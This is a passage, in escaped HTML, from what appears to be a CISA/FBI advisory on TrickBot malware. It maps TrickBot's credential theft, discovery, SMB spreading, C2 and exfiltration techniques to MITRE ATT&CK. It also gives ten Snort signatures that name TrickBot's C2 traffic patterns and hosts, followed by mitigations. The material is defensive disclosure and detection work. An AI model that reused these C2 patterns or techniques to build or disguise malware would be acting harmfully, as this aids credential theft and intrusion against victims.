			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot can steal passwords from the KeePass open-source password manager.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 195px; text-align: left;"&gt;Credentials from Password Stores: Credentials from Web Browsers&lt;/td&gt;
			&lt;td scope="col" style="width: 138px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1555/003/"&gt;T1555.003&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 251px; text-align: left;"&gt;TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Discovery&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0007/"&gt;TA0007&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="633" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 190px; text-align: center;"&gt;&lt;strong&gt;Technique Tactic&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 145px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 249px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;System Service Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1007/"&gt;T1007&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot collects a list of install programs and services on the system’s machine.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;System Network Configuration Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1016"&gt;T1016&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;Remote System Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1018"&gt;T1018&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot can enumerate computers and network devices.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;System Owner/User Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1033"&gt;T1033&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot can identify the user and groups the user belongs to on a compromised host.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;Permission Groups Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1069"&gt;T1069&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot can identify the groups the user on a compromised host belongs to.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;System Information Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1082"&gt;T1082&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot gathers the OS version, machine name, CPU type, amount of RAM available from the victim’s machine.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;File and Directory Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1083"&gt;T1083&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip. It can also obtain browsing history, cookies, and plug-in information.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;&lt;span style="line-height: 115%; font-family: &amp;quot;Arial&amp;quot;,sans-serif; font-size: 11pt; mso-fareast-font-family: Calibri; mso-fareast-theme-font: minor-latin; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-language: AR-SA;"&gt;Account Discovery: Local Account &lt;/span&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1087/001"&gt;T1087.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot collects the users of the system.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;Account Discovery: Email Account&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1087/003"&gt;T1087.003&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot collects email addresses from Outlook.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;Domain Trust Discovery&lt;/td&gt;
			&lt;td scope="col" style="width: 145px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1482"&gt;T1482&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 249px; text-align: left;"&gt;TrickBot can gather information about domain trusts by utilizing Nltest.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center" style="margin-bottom: 8px;"&gt;&lt;em&gt;Lateral Movement&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0008/"&gt;TA0008&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="63" style="margin-left: auto; margin-right: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 192px;"&gt;&lt;strong&gt;Technique Tactic&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 146px;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 246px;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left; width: 192px;"&gt;Lateral Tool Transfer&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 146px;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1570"&gt;T1570&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 246px;"&gt;Some TrickBot modules spread the malware laterally across a network by abusing the SMB Protocol.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center" style="margin-bottom: 8px;"&gt;&lt;em&gt;Collection&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0009/"&gt;TA0009&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="258" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 190px; text-align: center;"&gt;&lt;strong&gt;Technique Tactic &lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 149px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 245px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;Data from Local System&lt;/td&gt;
			&lt;td scope="col" style="width: 149px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1005"&gt;T1005&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 245px; text-align: left;"&gt;TrickBot collects local files and information from the victim’s local machine.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;Input Capture:Credential API Hooking&lt;/td&gt;
			&lt;td scope="col" style="width: 149px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1056/004/"&gt;T1056.004&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 245px; text-align: left;"&gt;TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 190px; text-align: left;"&gt;Person in the Browser&lt;/td&gt;
			&lt;td scope="col" style="width: 149px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1185"&gt;T1185&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 245px; text-align: left;"&gt;TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified webpage.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Command and Control&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0011/"&gt;TA0011&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="367" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 190px; text-align: center;"&gt;&lt;strong&gt;Technique Tactic &lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 153px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 242px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 188px; text-align: left;"&gt;Fallback Channels&lt;/td&gt;
			&lt;td scope="col" style="width: 153px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1008"&gt;T1008&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 242px; text-align: left;"&gt;TrickBot can use secondary command and control (C2) servers for communication after establishing connectivity and relaying victim information to primary C2 servers.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 188px; text-align: left;"&gt;Application Layer Protocol: Web Protocols&lt;/td&gt;
			&lt;td scope="col" style="width: 153px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1071/001"&gt;T1071.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 242px; text-align: left;"&gt;TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 188px; text-align: left;"&gt;Ingress Tool Transfer&lt;/td&gt;
			&lt;td scope="col" style="width: 153px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1105"&gt;T1105&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 242px; text-align: left;"&gt;TrickBot downloads several additional files and saves them to the victim's machine.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 188px; text-align: left;"&gt;Data Encoding: Standard Encoding&lt;/td&gt;
			&lt;td scope="col" style="width: 153px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1132/001"&gt;T1132.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 242px; text-align: left;"&gt;TrickBot can Base64-encode C2 commands.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 188px; text-align: left;"&gt;Non-Standard Port&lt;/td&gt;
			&lt;td scope="col" style="width: 153px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1571"&gt;T1571&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 242px; text-align: left;"&gt;Some TrickBot samples have used HTTP over ports 447 and 8082 for C2.&lt;/td&gt;
		&lt;/tr&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 188px; text-align: left;"&gt;Encrypted Channel: Symmetric Cryptography&lt;/td&gt;
			&lt;td scope="col" style="width: 153px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1573/001"&gt;T1573.001&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 242px; text-align: left;"&gt;TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center"&gt;&lt;em&gt;Exfiltration&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0010/"&gt;TA0010&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="78" style="margin-right: auto; margin-left: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 186px; text-align: center;"&gt;&lt;strong&gt;Technique Tactic&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 157px; text-align: center;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 241px; text-align: center;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="width: 186px; text-align: left;"&gt;Exfiltration Over C2 Channel&lt;/td&gt;
			&lt;td scope="col" style="width: 157px; text-align: left;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1041"&gt;T1041&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="width: 241px; text-align: left;"&gt;TrickBot can send information about the compromised host to a hardcoded C2 server.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p class="text-align-center" style="margin-bottom: 8px;"&gt;&lt;em&gt;Impact&lt;/em&gt; [&lt;a href="https://attack.mitre.org/versions/v8/tactics/TA0040/"&gt;TA0040&lt;/a&gt;]&lt;/p&gt;

&lt;table border="1" cellpadding="1" cellspacing="1" class="general-table" height="61" style="margin-left: auto; margin-right: auto;" width="600"&gt;
	&lt;thead&gt;
		&lt;tr&gt;
			&lt;th scope="col" style="width: 185px;"&gt;&lt;strong&gt;Technique Tactic&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 158px;"&gt;&lt;strong&gt;ID&lt;/strong&gt;&lt;/th&gt;
			&lt;th scope="col" style="width: 241px;"&gt;&lt;strong&gt;Use&lt;/strong&gt;&lt;/th&gt;
		&lt;/tr&gt;
	&lt;/thead&gt;
	&lt;tbody&gt;
		&lt;tr&gt;
			&lt;td scope="col" style="text-align: left; width: 185px;"&gt;Resource Hijacking&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 158px;"&gt;&lt;a href="https://attack.mitre.org/versions/v8/techniques/T1496"&gt;T1496&lt;/a&gt;&lt;/td&gt;
			&lt;td scope="col" style="text-align: left; width: 241px;"&gt;TrickBot actors can leverage the resources of co-opted systems for cryptomining to validate transactions of cryptocurrency networks and earn virtual currency.&lt;/td&gt;
		&lt;/tr&gt;
	&lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 style="margin-bottom: 8px;"&gt;Detection&lt;/h3&gt;

&lt;h4&gt;Signatures&lt;/h4&gt;

&lt;p style="margin-bottom: 8px;"&gt;&lt;font color="#000000"&gt;&lt;font size="3"&gt;CISA developed the following snort signature for use in detecting network activity associated with TrickBot activity.&lt;/font&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any [443,447] -&amp;gt; any any (msg:"TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'example.com' (Hex)"; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:"|0b|example.com"; fast_pattern:only; content:"Global Security"; content:"IT Department"; pcre:"/(?:\x09\x00\xc0\xb9\x3b\x93\x72\xa3\xf6\xd2|\x00\xe2\x08\xff\xfb\x7b\x53\x76\x3d)/"; classtype:bad-unknown; metadata:service ssl,service and-ports;)&lt;/font&gt;&lt;/font&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any any -&amp;gt; any $HTTP_PORTS (msg:"TRICKBOT_ANCHOR:HTTP URI GET contains '/anchor'"; sid:1; rev:1; flow:established,to_server; content:"/anchor"; http_uri; fast_pattern:only; content:"GET"; nocase; http_method; pcre:"/^\/anchor_?.{3}\/[\w_-]+\.[A-F0-9]+\/?$/U"; classtype:bad-unknown; priority:1; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any $SSL_PORTS -&amp;gt; any any (msg:"TRICKBOT:SSL/TLS Server X.509 Cert Field contains 'C=XX, L=Default City, O=Default Company Ltd'"; sid:1; rev:1; flow:established,from_server; ssl_state:server_hello; content:"|31 0b 30 09 06 03 55 04 06 13 02|XX"; nocase; content:"|31 15 30 13 06 03 55 04 07 13 0c|Default City"; nocase; content:"|31 1c 30 1a 06 03 55 04 0a 13 13|Default Company Ltd"; nocase; content:!"|31 0c 30 0a 06 03 55 04 03|"; classtype:bad-unknown; reference:url,www.virustotal.com/gui/file/e9600404ecc42cf86d38deedef94068db39b7a0fd06b3b8fb2d8a3c7002b650e/detection; metadata:service ssl;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any any -&amp;gt; any $HTTP_PORTS (msg:"TRICKBOT:HTTP Client Header contains 'boundary=Arasfjasu7'"; sid:1; rev:1; flow:established,to_server; content:"boundary=Arasfjasu7|0d 0a|"; http_header; content:"name=|22|proclist|22|"; http_header; content:!"Referer"; content:!"Accept"; content:"POST"; http_method; classtype:bad-unknown; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any any -&amp;gt; any $HTTP_PORTS (msg:"TRICKBOT:HTTP Client Header contains 'User-Agent|3a 20|WinHTTP loader/1.'"; sid:1; rev:1; flow:established,to_server; content:"User-Agent|3a 20|WinHTTP loader/1."; http_header; fast_pattern:only; content:".png|20|HTTP/1."; pcre:"/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}(?:\x3a\d{2,5})?$/mH"; content:!"Accept"; http_header; content:!"Referer|3a 20|"; http_header; classtype:bad-unknown; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any $HTTP_PORTS -&amp;gt; any any (msg:"TRICKBOT:HTTP Server Header contains 'Server|3a 20|Cowboy'"; sid:1; rev:1; flow:established,from_server; content:"200"; http_stat_code; content:"Server|3a 20|Cowboy|0d 0a|"; http_header; fast_pattern; content:"content-length|3a 20|3|0d 0a|"; http_header; file_data; content:"/1/"; depth:3; isdataat:!1,relative; classtype:bad-unknown; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any any -&amp;gt; any $HTTP_PORTS (msg:"TRICKBOT:HTTP URI POST contains C2 Exfil"; sid:1; rev:1; flow:established,to_server; content:"Content-Type|3a 20|multipart/form-data|3b 20|boundary=------Boundary"; http_header; fast_pattern; content:"User-Agent|3a 20|"; http_header; distance:0; content:"Content-Length|3a 20|"; http_header; distance:0; content:"POST"; http_method; pcre:"/^\/[a-z]{3}\d{3}\/.+?\.[A-F0-9]{32}\/\d{1,3}\//U"; pcre:"/^Host\x3a\x20(?:\d{1,3}\.){3}\d{1,3}$/mH"; content:!"Referer|3a|"; http_header; classtype:bad-unknown; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any any -&amp;gt; any $HTTP_PORTS (msg:"HTTP URI GET/POST contains '/56evcxv' (Trickbot)"; sid:1; rev:1; flow:established,to_server; content:"/56evcxv"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert icmp any any -&amp;gt; any any (msg:"TRICKBOT_ICMP_ANCHOR:ICMP traffic conatins 'hanc'"; sid:1; rev:1; itype:8; content:"hanc"; offset:4; fast_pattern; classtype:bad-unknown;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any any -&amp;gt; any $HTTP_PORTS (msg:"HTTP Client Header contains POST with 'host|3a 20|*.onion.link' and 'data=' (Trickbot/Princess Ransomeware)"; sid:1; rev:1; flow:established,to_server; content:"POST"; nocase; http_method; content:"host|3a 20|"; http_header; content:".onion.link"; nocase; http_header; distance:0; within:47; fast_pattern; file_data; content:"data="; distance:0; within:5; classtype:bad-unknown; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;

&lt;div class="special_container" style="margin-bottom: 8px;"&gt;&lt;span style="color: black;"&gt;&lt;font face="Consolas"&gt;&lt;font size="3"&gt;alert tcp any any -&amp;gt; any $HTTP_PORTS (msg:"HTTP Client Header contains 'host|3a 20|tpsci.com' (trickbot)"; sid:1; rev:1; flow:established,to_server; content:"host|3a 20|tpsci.com"; http_header; fast_pattern:only; classtype:bad-unknown; metadata:service http;)&lt;/font&gt;&lt;/font&gt;&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;Mitigations&lt;/h3&gt;&lt;p&gt;CISA and FBI recommend that network defenders—in federal, state, local, tribal, territorial governments, and the private sector—consider applying the following best practices to strengthen the security posture of their organization's systems. System owners and administrators should review any configuration changes prior to implementation to avoid negative impacts.&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Provide social engineering and phishing training to employees.&lt;/li&gt;
	&lt;li&gt;Consider drafting or updating a policy addressing suspicious emails&amp;nbsp; that specifies users must report all suspicious emails to the security and/or IT departments.&lt;/li&gt;
	&lt;li&gt;Mark external emails with a banner denoting the email is from an external source to assist users in detecting spoofed emails.&lt;/li&gt;
	&lt;li&gt;Implement Group Policy Object and firewall rules.&lt;/li&gt;
	&lt;li&gt;Implement an antivirus program and a formalized patch management process.&lt;/li&gt;
	&lt;li&gt;Implement filters at the email gateway and block suspicious IP addresses at the firewall.&lt;/li&gt;
	&lt;li&gt;Adhere to the principle of least privilege.&lt;/li&gt;
	&lt;li&gt;Implement a Domain-Based Message Authentication, Reporting &amp;amp; Conformance validation system.&lt;/li&gt;
	&lt;li&gt;Segment and segregate networks and functions.&lt;/li&gt;
	&lt;li&gt;Limit unnecessary lateral communications between network hoses, segments, and devices.&lt;/li&gt;
	&lt;li&gt;Consider using application allowlisting technology on all assets to ensure that only authorized software executes, and all unauthorized software is blocked from executing on assets. Ensure that such technology only allows authorized, digitally signed scripts to run on a system.&lt;/li&gt;
	&lt;li&gt;Enforce multi-factor authentication.&lt;/li&gt;
	&lt;li&gt;Enable a firewall on agency workstations configured to deny unsolicited connection requests.&lt;/li&gt;
	&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
	&lt;li&gt;Implement an Intrusion Detection System, if not already used, to detect C2 activity and other potentially malicious network activity&lt;/li&gt;
	&lt;li&gt;Monitor web traffic. Restrict user access to suspicious or risky sites.&lt;/li&gt;
	&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate access control lists.&lt;/li&gt;
	&lt;li&gt;Disable the use of SMBv1 across the network and require at least SMBv2 to harden systems against network propagation modules used by TrickBot.&lt;/li&gt;
	&lt;li&gt;Visit the MITRE ATT&amp;amp;CK Techniques pages (linked in table 1 above) for additional mitigation and detection strategies.&lt;/li&gt;
	&lt;li&gt;See CISA’s Alert on &lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-245a"&gt;Technical Approaches to Uncovering and Remediating Malicious Activity&lt;/a&gt; for more information on addressing potential incidents and applying best practice incident response procedures.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;For additional information on malware incident prevention and handling, see the National Institute of Standards and Technology Special Publication 800-83, &lt;a href="https://csrc.nist.gov/publications/detail/sp/800-83/rev-1/final"&gt;Guide to Malware Incident Prevention and Handling for Desktops and Laptops&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;Resources&lt;/h3&gt;

&lt;ul&gt;
	&lt;li&gt;&lt;a href="https://us-cert.cisa.gov/sites/default/files/publications/TrickBot_Fact_Sheet_508.pdf"&gt;CISA Fact Sheet: TrickBot Malware&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://www.cisecurity.org/white-papers/security-primer-trickbot/"&gt;MS-ISAC White Paper: Security Primer – TrickBot&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://www.ncsc.gov.uk/news/ryuk-advisory"&gt;United Kingdom National Cyber Security Centre Advisory: Ryuk Ransomware Targeting Organisations Globally&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://us-cert.cisa.gov/ncas/alerts/aa20-280a"&gt;CISA and MS-ISAC Joint Alert AA20-280A: Emotet Malware&lt;/a&gt;&lt;/li&gt;
	&lt;li&gt;&lt;a href="https://attack.mitre.org/matrices/enterprise/"&gt;MITRE ATT&amp;amp;CK for Enterprise&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
                    &lt;h3&gt;References&lt;/h3&gt;
		        &lt;ul&gt;		            	&lt;li&gt;&lt;a href="https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html"&gt;[1] FireEye Blog - A Nasty Trick: From Credential Theft Malware to Business Disruption&lt;/a&gt;&lt;/li&gt;		            	&lt;li&gt;&lt;a href="https://eclypsium.com/2020/12/03/trickbot-now-offers-trickboot-persist-brick-profit/#background"&gt;[2] Eclypsium Blog - TrickBot Now Offers 'TrickBoot': Persist, Brick, Profit&lt;/a&gt;&lt;/li&gt;		        &lt;/ul&gt;            &lt;h3&gt;Revisions&lt;/h3&gt;
